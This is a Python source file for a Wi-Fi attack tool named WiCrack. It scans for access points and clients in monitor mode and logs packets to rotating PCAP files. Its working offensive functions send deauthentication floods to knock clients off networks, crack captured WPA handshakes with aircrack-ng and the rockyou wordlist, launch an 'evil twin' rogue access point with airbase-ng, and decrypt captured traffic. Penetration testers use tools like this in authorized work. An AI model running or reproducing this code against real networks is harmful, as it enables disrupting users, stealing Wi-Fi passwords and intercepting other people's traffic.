import time
import os
import subprocess
import re
import shutil
from datetime import datetime
try:
    from scapy.all import sniff, sendp, EAPOL, PcapWriter
    from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth, RadioTap
    SCAPY_IMPORT_ERROR = None
except ModuleNotFoundError as exc:
    SCAPY_IMPORT_ERROR = exc

class WifiScanner:
    OUI_MAP = {"fc:ec:da": "Apple",
        "3c:a0:67": "Samsung",
        "00:0c:29": "VMware",
        "d8:0d:17": "TP-Link",
        "80:d0:4a": "Technicolor",
        "70:3a:2d": "outside camera"}
    OUI_DB_PATHS = [
        "/usr/share/ieee-data/oui.txt",
        "/usr/share/misc/oui.txt",
    ]
    MANUF_DB_PATHS = [
        "/usr/share/wireshark/manuf",
        "/etc/manuf",
    ]

    def __init__(
        self,
        interface=None,
        gui_callback=None,
        pcap_path=None,
        rotate_mb=25,
        rotate_minutes=15,
        retention_hours=24,
        cleanup_interval_minutes=5,
        max_capture_gb=1,
    ):
        if SCAPY_IMPORT_ERROR is not None:
            raise RuntimeError(
                "Scapy is not installed. Install it with: pip install scapy"
            ) from SCAPY_IMPORT_ERROR

        self.gui_callback = gui_callback
        self.requested_interface = interface
        self.interface = self.detect_interface(preferred=interface)
        self.interface = self._ensure_monitor_mode(self.interface)
        self._bring_interface_up(self.interface)
        self.found_networks = []
        self.found_clients = {}
        self.target_bssid = None
        self.oui_cache = self._load_oui_database()
        self.rotate_bytes = int(rotate_mb * 1024 * 1024)
        self.rotate_seconds = int(rotate_minutes * 60)
        self.retention_seconds = int(retention_hours * 60 * 60)
        self.cleanup_interval_seconds = int(cleanup_interval_minutes * 60)
        self.max_capture_bytes = int(max_capture_gb * 1024 * 1024 * 1024)
        self.last_cleanup_at = 0
        self.packets_written = 0
        self.pcap_opened_at = 0
        self.pcap_path = pcap_path or self._default_pcap_path()
        self.pcap_writer = self._init_pcap_writer(self.pcap_path)
        self._prune_old_captures(force=True)

    def __del__(self):
        self.close()

    def close(self):
        self._close_pcap_writer()

    def _log(self, message):
        if self.gui_callback:
            self.gui_callback(message + "\n")
        else:
            print(message)

    def _iface_path(self, interface, leaf):
        return f"/sys/class/net/{interface}/{leaf}"

    def _default_pcap_path(self):
        captures_dir = os.path.join(os.getcwd(), "captures")
        os.makedirs(captures_dir, exist_ok=True)
        stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        return os.path.join(captures_dir, f"wicrack_{stamp}.pcap")

    def _captures_dir(self):
        return os.path.dirname(self.pcap_path)

    def _init_pcap_writer(self, path):
        try:
            writer = PcapWriter(path, append=True, sync=True)
            self.pcap_opened_at = time.time()
            self.packets_written = 0
            self._log(f"[*] Writing capture to: {path}")
            return writer
        except Exception as e:
            self._log(f"[!] Could not open PCAP file '{path}': {e}")
            return None

    def _close_pcap_writer(self):
        try:
            if getattr(self, "pcap_writer", None):
                self.pcap_writer.close()
        except Exception:
            pass
        self.pcap_writer = None

    def _rotate_capture_if_needed(self):
        if not self.pcap_writer:
            return

        should_rotate = False

        if self.rotate_seconds > 0 and (time.time() - self.pcap_opened_at) >= self.rotate_seconds:
            should_rotate = True

        if not should_rotate and self.rotate_bytes > 0:
            try:
                if os.path.getsize(self.pcap_path) >= self.rotate_bytes:
                    should_rotate = True
            except OSError:
                pass

        if not should_rotate:
            return

        old_path = self.pcap_path
        self._close_pcap_writer()
        self.pcap_path = self._default_pcap_path()
        self.pcap_writer = self._init_pcap_writer(self.pcap_path)
        self._log(f"[*] Rotated capture file: {old_path}")
        self._prune_old_captures(force=True)

    def _prune_old_captures(self, force=False):
        if self.retention_seconds <= 0 and self.max_capture_bytes <= 0:
            return

        now = time.time()
        if not force and self.cleanup_interval_seconds > 0:
            if (now - self.last_cleanup_at) < self.cleanup_interval_seconds:
                return

        captures_dir = self._captures_dir()
        if not captures_dir or not os.path.isdir(captures_dir):
            self.last_cleanup_at = now
            return

        cutoff = now - self.retention_seconds
        deleted = 0
        deleted_for_size = 0
        active_path = os.path.abspath(self.pcap_path)
        capture_files = []

        try:
            with os.scandir(captures_dir) as entries:
                for entry in entries:
                    if not entry.is_file():
                        continue
                    if not entry.name.lower().endswith((".pcap", ".pcapng")):
                        continue

                    file_path = os.path.abspath(entry.path)
                    if file_path == active_path:
                        continue

                    try:
                        stat = entry.stat()
                        capture_files.append((file_path, stat.st_mtime, stat.st_size))

                        if self.retention_seconds > 0 and stat.st_mtime < cutoff:
                            os.remove(file_path)
                            deleted += 1
                    except OSError:
                        continue
        except OSError:
            self.last_cleanup_at = now
            return

        if self.max_capture_bytes > 0:
            kept_files = []
            total_bytes = 0
            for file_path, mtime, size in capture_files:
                if not os.path.exists(file_path):
                    continue
                kept_files.append((file_path, mtime, size))
                total_bytes += size

            if total_bytes > self.max_capture_bytes:
                kept_files.sort(key=lambda item: item[1])
                for file_path, _mtime, size in kept_files:
                    if total_bytes <= self.max_capture_bytes:
                        break
                    try:
                        os.remove(file_path)
                        deleted_for_size += 1
                        total_bytes -= size
                    except OSError:
                        continue

        self.last_cleanup_at = now
        if deleted > 0:
            self._log(f"[*] Capture cleanup removed {deleted} old file(s).")
        if deleted_for_size > 0:
            self._log(f"[*] Capture cleanup removed {deleted_for_size} file(s) to keep total under {self.max_capture_bytes // (1024 * 1024 * 1024)} GB.")

    def get_capture_path(self):
        return self.pcap_path

    def _iface_exists(self, interface):
        return os.path.isdir(f"/sys/class/net/{interface}")

    def _iface_device_path(self, interface):
        return os.path.realpath(f"/sys/class/net/{interface}/device")

    def _is_wireless(self, interface):
        return os.path.isdir(self._iface_path(interface, "wireless"))

    def _iface_looks_usb(self, interface):
        try:
            return "/usb" in self._iface_device_path(interface)
        except Exception:
            return False

    def _iface_type(self, interface):
        try:
            with open(self._iface_path(interface, "type"), "r", encoding="utf-8") as f:
                return int(f.read().strip())
        except Exception:
            return None

    def _iface_operstate(self, interface):
        try:
            with open(self._iface_path(interface, "operstate"), "r", encoding="utf-8") as f:
                return f.read().strip().lower()
        except Exception:
            return "unknown"

    def _iw_path(self):
        return shutil.which("iw")

    def _ip_path(self):
        return shutil.which("ip")

    def _run_iface_cmd(self, args):
        result = subprocess.run(args, capture_output=True, text=True)
        if result.returncode != 0:
            err = result.stderr.strip() or result.stdout.strip() or "unknown error"
            raise RuntimeError(err)
        return result

    def _iface_mode_name(self, interface):
        iw_path = self._iw_path()
        if not iw_path or not self._iface_exists(interface):
            if self._iface_type(interface) == 803:
                return "monitor"
            return "unknown"

        try:
            result = subprocess.run(
                [iw_path, "dev", interface, "info"],
                capture_output=True,
                text=True,
            )
        except Exception:
            result = None

        if result and result.returncode == 0:
            for line in result.stdout.splitlines():
                stripped = line.strip()
                if stripped.startswith("type "):
                    return stripped.split(" ", 1)[1].strip().lower()

        if self._iface_type(interface) == 803:
            return "monitor"
        return "unknown"

    def _list_wireless_interfaces(self):
        interfaces = set()

        try:
            for iface in os.listdir("/sys/class/net/"):
                if self._iface_exists(iface) and self._is_wireless(iface):
                    interfaces.add(iface)
        except Exception:
            pass

        iw_path = self._iw_path()
        if iw_path:
            try:
                result = subprocess.run(
                    [iw_path, "dev"],
                    capture_output=True,
                    text=True,
                )
                if result.returncode == 0:
                    for line in result.stdout.splitlines():
                        stripped = line.strip()
                        if stripped.startswith("Interface "):
                            iface = stripped.split(" ", 1)[1].strip()
                            if iface:
                                interfaces.add(iface)
            except Exception:
                pass

        return sorted(interfaces)

    def _interface_score(self, interface, preferred=None):
        score = 0

        if preferred and interface == preferred:
            score += 200
        if self._iface_exists(interface):
            score += 20
        if self._is_wireless(interface):
            score += 80
        if self._iface_mode_name(interface) == "monitor":
            score += 120
        if self._iface_is_up(interface):
            score += 20
        if self._iface_looks_usb(interface):
            score += 40
        if interface.startswith("wlan"):
            score += 15
        elif interface.startswith("wl"):
            score += 10

        return score

    def _pick_best_interface(self, preferred=None):
        candidates = self._list_wireless_interfaces()
        if not candidates:
            return None

        ranked = sorted(
            candidates,
            key=lambda iface: (self._interface_score(iface, preferred), iface),
            reverse=True,
        )
        return ranked[0]

    def _refresh_interface_selection(self):
        preferred = self.requested_interface or self.interface
        current_valid = self._iface_exists(self.interface) and self._is_wireless(self.interface)
        best = self._pick_best_interface(preferred=preferred)

        if best is None:
            return self.interface

        if not current_valid:
            if best != self.interface:
                self._log(f"[*] Switched interface selection to {best} (previous interface unavailable).")
            self.interface = best
            return self.interface

        current_score = self._interface_score(self.interface, preferred=preferred)
        best_score = self._interface_score(best, preferred=preferred)
        if best != self.interface and best_score >= current_score + 60:
            self._log(f"[*] Switched interface selection from {self.interface} to {best}.")
            self.interface = best

        return self.interface

    def _iface_is_up(self, interface):
        return self._iface_operstate(interface) in ("up", "unknown")

    def _bring_interface_up(self, interface):
        if not self._iface_exists(interface):
            return False

        if self._iface_is_up(interface):
            return True

        result = subprocess.run(
            ["ip", "link", "set", interface, "up"],
            capture_output=True,
            text=True,
        )
        if result.returncode != 0:
            err = result.stderr.strip() or result.stdout.strip() or "unknown error"
            self._log(f"[!] Failed to bring {interface} up: {err}")
            return False

        time.sleep(0.3)
        return self._iface_is_up(interface)

    def _ensure_monitor_mode(self, interface):
        if not self._iface_exists(interface):
            refreshed = self._pick_best_interface(preferred=self.requested_interface)
            if refreshed:
                interface = refreshed
                self.interface = refreshed
            else:
                return interface

        current_mode = self._iface_mode_name(interface)
        if current_mode == "monitor":
            self._log(f"[*] Interface {interface} already in monitor mode.")
            return interface

        if not self._is_wireless(interface):
            self._log(f"[!] Interface {interface} is not a wireless adapter.")
            return interface

        iw_path = self._iw_path()
        ip_path = self._ip_path()
        if not iw_path or not ip_path:
            self._log("[!] Missing 'iw' or 'ip'; cannot switch interface to monitor mode automatically.")
            return interface

        self._log(f"[*] Switching {interface} from {current_mode} to monitor mode...")
        try:
            self._run_iface_cmd([ip_path, "link", "set", interface, "down"])
            self._run_iface_cmd([iw_path, "dev", interface, "set", "type", "monitor"])
            self._run_iface_cmd([ip_path, "link", "set", interface, "up"])
        except RuntimeError as exc:
            self._log(f"[!] Failed to enable monitor mode on {interface}: {exc}")
            self._log("[!] Start WiCrack with sudo/root and ensure the USB adapter is attached to the VM.")
            return interface

        time.sleep(0.5)
        if self._iface_mode_name(interface) == "monitor":
            self._log(f"[*] Interface {interface} is now in monitor mode.")
        else:
            self._log(f"[!] Interface {interface} did not report monitor mode after switch attempt.")

        return interface

    def _normalize_oui(self, mac):
        if not mac:
            return None
        parts = mac.lower().split(":")
        if len(parts) < 3:
            return None
        return ":".join(parts[:3])

    def _is_locally_administered(self, mac):
        try:
            first_octet = int(mac.split(":")[0], 16)
            # LAA bit set means likely randomized or locally assigned MAC.
            return bool(first_octet & 0x02)
        except Exception:
            return False

    def _load_oui_database(self):
        cache = {}
        line_re = re.compile(r"^([0-9A-Fa-f]{2})-([0-9A-Fa-f]{2})-([0-9A-Fa-f]{2})\s+\(hex\)\s+(.+)$")

        for db_path in self.OUI_DB_PATHS:
            if not os.path.exists(db_path):
                continue

            try:
                with open(db_path, "r", encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        match = line_re.match(line.strip())
                        if not match:
                            continue
                        oui = f"{match.group(1).lower()}:{match.group(2).lower()}:{match.group(3).lower()}"
                        vendor = match.group(4).strip()
                        if vendor and oui not in cache:
                            cache[oui] = vendor
            except Exception:
                continue

            if cache:
                break

        # Supplement with Wireshark manuf database (colon-separated, tab-delimited).
        manuf_re = re.compile(r"^([0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2})\t(.+)$")
        for db_path in self.MANUF_DB_PATHS:
            if not os.path.exists(db_path):
                continue
            try:
                with open(db_path, "r", encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        line = line.strip()
                        if not line or line.startswith("#"):
                            continue
                        match = manuf_re.match(line)
                        if not match:
                            continue
                        oui = match.group(1).lower()
                        vendor_field = match.group(2).strip()
                        # Prefer long name (3rd tab-separated column) over short name.
                        parts = vendor_field.split("\t", 1)
                        vendor = parts[1].strip() if len(parts) > 1 else parts[0].strip()
                        if vendor and oui not in cache:
                            cache[oui] = vendor
            except Exception:
                continue
            break

        return cache

    def lookup_vendor(self, mac):
        oui = self._normalize_oui(mac)
        if not oui:
            return "Unknown"

        if oui in self.OUI_MAP:
            return self.OUI_MAP[oui]

        vendor = self.oui_cache.get(oui)
        if vendor:
            return vendor

        if self._is_locally_administered(mac):
            return "Randomized/Local"

        return "Unknown"

    def detect_interface(self, preferred=None):
        preferred_order = []
        if preferred:
            preferred_order.append(preferred)
        preferred_order.extend(["wlan0mon", "wlan0"])

        wireless_ifaces = self._list_wireless_interfaces()
        for iface in preferred_order + wireless_ifaces:
            if self._iface_exists(iface) and self._iface_mode_name(iface) == "monitor":
                self._log(f"[*] Using monitor interface: {iface}")
                return iface

        best = self._pick_best_interface(preferred=preferred)
        if best:
            mode = self._iface_mode_name(best)
            usb_note = " (USB)" if self._iface_looks_usb(best) else ""
            self._log(f"[*] Using wireless interface: {best}{usb_note} [mode={mode}]")
            return best

        return preferred or "wlan0"
    
    def channel_hopper(self, stop_event=None):
        ch = 1
        while not (stop_event and stop_event.is_set()):
            os.system(f"iwconfig {self.interface} channel {ch}")
            ch = ch % 13 + 1
            time.sleep(1.0)

    def packet_callback(self, pkt):
        self._prune_old_captures()

        if self.pcap_writer is not None:
            try:
                self.pcap_writer.write(pkt)
                self.packets_written += 1
                if self.packets_written % 30 == 0:
                    self._rotate_capture_if_needed()
            except Exception as e:
                self._log(f"[!] Failed to write packet to PCAP: {e}")
                self.pcap_writer = None

        if pkt.haslayer(Dot11Beacon):
            bssid = pkt[Dot11].addr3
            if bssid not in self.found_networks:
                self.found_networks.append(bssid)
                try:
                    ssid = pkt[Dot11Elt].info.decode()
                    if ssid == "": ssid = "<Hidden>"
                except:
                    ssid = "<Error>"

                msg = f"[AP] {ssid} [{bssid}]\n"
                if self.gui_callback: self.gui_callback(msg)

        elif pkt.haslayer(EAPOL):
            target_ap = pkt[Dot11].addr3
            client_mac = pkt[Dot11].addr2
            msg = f"[!] Handshake Detected: {client_mac} -> {target_ap}\n"
            if self.gui_callback:
                self.gui_callback(msg)

        elif pkt.haslayer(Dot11):
            target = pkt[Dot11].addr3
            sa = pkt[Dot11].addr2
            da = pkt[Dot11].addr1
            
            if target and sa and da:
                client = sa if sa != target else da
                
                if client and len(client) >= 17 and client != "ff:ff:ff:ff:ff:ff":
                    if target not in self.found_clients:
                        self.found_clients[target] = []
                    
                    if client not in self.found_clients[target]:
                        self.found_clients[target].append(client)
                        vendor = self.lookup_vendor(client)
                        
                        msg = f"[CLIENT] {client} ({vendor}) on {target}\n"
                        
                        if self.gui_callback:
                            self.gui_callback(msg)

    def send_deauth(self, client_mac, bssid):
        pkt = RadioTap() / Dot11(addr1=client_mac, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
        sendp(pkt, iface=self.interface, count=100, inter=0.1, verbose=False)

    # ------------------------------------------------------------------ #
    # Aircrack-ng suite integration                                        #
    # ------------------------------------------------------------------ #

    def crack_handshake(self, pcap_path=None, wordlist_path=None, bssid=None):
        """Run aircrack-ng against a PCAP to crack WPA/WPA2 PSK.

        Returns the recovered key string, or None if not found.
        """
        aircrack = shutil.which("aircrack-ng")
        if not aircrack:
            self._log("[!] aircrack-ng not found. Install it with: sudo apt install aircrack-ng")
            return None

        target_pcap = pcap_path or self.pcap_path
        if not os.path.exists(target_pcap):
            self._log(f"[!] PCAP not found: {target_pcap}")
            return None

        if not wordlist_path:
            script_dir = os.path.dirname(os.path.abspath(__file__))
            candidates = [
                os.path.join(script_dir, "..", "netman_kali", "100k_passwords.txt"),
                "/usr/share/wordlists/rockyou.txt",
            ]
            for c in candidates:
                if os.path.exists(c):
                    wordlist_path = os.path.abspath(c)
                    break

        if not wordlist_path or not os.path.exists(wordlist_path):
            self._log("[!] No wordlist found for cracking. Provide a wordlist_path.")
            return None

        cmd = [aircrack, "-w", wordlist_path, target_pcap]
        if bssid:
            cmd += ["-b", bssid]

        self._log(f"[*] aircrack-ng starting: pcap={target_pcap} wordlist={wordlist_path}")
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            output = result.stdout + result.stderr
            for line in output.splitlines():
                if "KEY FOUND" in line.upper():
                    self._log(f"[+] {line.strip()}")
                    match = re.search(r"\[\s*(.+?)\s*\]", line)
                    if match:
                        return match.group(1)
                elif line.strip():
                    self._log(line.rstrip())
            return None
        except subprocess.TimeoutExpired:
            self._log("[!] aircrack-ng timed out after 300 seconds.")
            return None
        except Exception as exc:
            self._log(f"[!] aircrack-ng error: {exc}")
            return None

    def send_deauth_aireplay(self, client_mac, bssid, count=10, channel=None):
        """Send deauth frames via aireplay-ng (more driver-compatible than Scapy).

        Falls back to Scapy send_deauth if aireplay-ng is not available.
        """
        aireplay = shutil.which("aireplay-ng")
        if not aireplay:
            self._log("[!] aireplay-ng not found, falling back to Scapy deauth.")
            self.send_deauth(client_mac, bssid)
            return

        if channel is not None:
            os.system(f"iwconfig {self.interface} channel {channel}")

        cmd = [aireplay, "-0", str(count), "-a", bssid, "-c", client_mac, self.interface]
        self._log(f"[*] aireplay-ng: sending {count} deauth to {client_mac} via {bssid}")
        try:
            subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        except subprocess.TimeoutExpired:
            self._log("[!] aireplay-ng deauth timed out.")
        except Exception as exc:
            self._log(f"[!] aireplay-ng error: {exc}")

    def start_evil_twin(self, ssid, channel=1):
        """Launch a rogue AP cloning ssid using airbase-ng.

        Returns True if the process started, False otherwise.
        Call stop_evil_twin() to shut it down.
        """
        airbase = shutil.which("airbase-ng")
        if not airbase:
            self._log("[!] airbase-ng not found. Install it with: sudo apt install aircrack-ng")
            return False

        if getattr(self, "_evil_twin_proc", None) is not None:
            self._log("[!] Evil twin already running. Call stop_evil_twin() first.")
            return False

        cmd = [airbase, "-e", ssid, "-c", str(channel), self.interface]
        self._log(f"[*] Starting evil twin: SSID='{ssid}' CH={channel} iface={self.interface}")
        try:
            self._evil_twin_proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            return True
        except Exception as exc:
            self._log(f"[!] airbase-ng error: {exc}")
            self._evil_twin_proc = None
            return False

    def stop_evil_twin(self):
        """Stop the rogue AP started by start_evil_twin."""
        proc = getattr(self, "_evil_twin_proc", None)
        if proc is None:
            self._log("[*] No evil twin running.")
            return
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
        self._evil_twin_proc = None
        self._log("[*] Evil twin stopped.")

    def decrypt_pcap(self, pcap_path=None, key=None, bssid=None):
        """Decrypt a WPA/WPA2-captured PCAP with airdecap-ng.

        The decrypted file is written next to the original with a '-dec.cap' suffix.
        Returns the decrypted file path, or None on failure.
        """
        airdecap = shutil.which("airdecap-ng")
        if not airdecap:
            self._log("[!] airdecap-ng not found. Install it with: sudo apt install aircrack-ng")
            return None

        target_pcap = pcap_path or self.pcap_path
        if not os.path.exists(target_pcap):
            self._log(f"[!] PCAP not found: {target_pcap}")
            return None

        if not key:
            self._log("[!] No key provided for PCAP decryption.")
            return None

        cmd = [airdecap, "-p", key, target_pcap]
        if bssid:
            cmd += ["-b", bssid]

        self._log(f"[*] airdecap-ng: decrypting {target_pcap} with key '{key}'")
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                cwd=os.path.dirname(os.path.abspath(target_pcap)),
            )
            for line in (result.stdout + result.stderr).splitlines():
                if line.strip():
                    self._log(line.rstrip())
            base = os.path.splitext(os.path.abspath(target_pcap))[0]
            decrypted_path = base + "-dec.cap"
            if os.path.exists(decrypted_path):
                self._log(f"[+] Decrypted PCAP: {decrypted_path}")
                return decrypted_path
            return None
        except Exception as exc:
            self._log(f"[!] airdecap-ng error: {exc}")
            return None

    def start_scan(self, stop_event=None):
        self._refresh_interface_selection()
        self.interface = self._ensure_monitor_mode(self.interface)

        if not self._bring_interface_up(self.interface):
            self._log(f"[!] Interface {self.interface} is down and could not be brought up.")

        filters_to_try = [
            "wlan type mgt or wlan type data",
            "type mgt or type data",
        ]

        active_filter = None
        for bpf_filter in filters_to_try:
            try:
                sniff(iface=self.interface, prn=self.packet_callback, filter=bpf_filter, store=0, timeout=1)
                active_filter = bpf_filter
                self._log(f"[*] Active filter: {bpf_filter}")
                break
            except Exception as e:
                msg = f"[!] Failed BPF filter '{bpf_filter}': {e}"
                if self.gui_callback:
                    self.gui_callback(msg + "\n")
                else:
                    print(msg)

        try:
            if active_filter is None:
                warn = "[!] Falling back to unfiltered sniff. Ensure monitor mode is enabled for best results."
                self._log(warn)

            while not (stop_event and stop_event.is_set()):
                sniff(
                    iface=self.interface,
                    prn=self.packet_callback,
                    filter=active_filter,
                    store=0,
                    timeout=1,
                )
        except Exception as e:
            self._log(f"[!] Scapy Socket Error: {e}")
        finally:
            self._close_pcap_writer()

if __name__ == "__main__":
    scanner = WifiScanner("wlan0mon")
    scanner.start_scan()